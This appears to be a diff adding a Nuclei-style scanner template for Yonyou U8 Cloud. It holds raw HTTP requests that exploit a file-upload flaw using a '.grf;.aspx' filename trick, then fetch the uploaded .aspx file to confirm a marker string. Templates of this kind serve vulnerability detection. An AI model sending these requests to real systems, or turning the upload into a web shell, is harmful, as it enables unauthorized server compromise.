@@ -1,0 +1,43 @@
+id: system
+info:
+  name: xxx
+  author: mike
+  severity: info
+  description: xxx
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="用友-U8-Cloud"
+http:
+  - raw:
+      - |
+        POST /Sys_ReportFile/ImportReport?encode=mikes HTTP/1.1
+        Host: {{Hostname}} 
+        User-Agent: Mozilla/5.0 (Macintosh;T2lkQm95X0c= Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryxzUhGld6cusN3Alk
+        Content-Length: 213
+
+        ------WebKitFormBoundaryxzUhGld6cusN3Alk
+        Content-Disposition: form-data; name="file"; .filename="1234.grf;.aspx"
+        Content-Type: application/octet-stream
+
+        20231101
+        ------WebKitFormBoundaryxzUhGld6cusN3Alk--
+
+      - |
+        GET /GRF/Custom/mikes.aspx  HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "20231101"
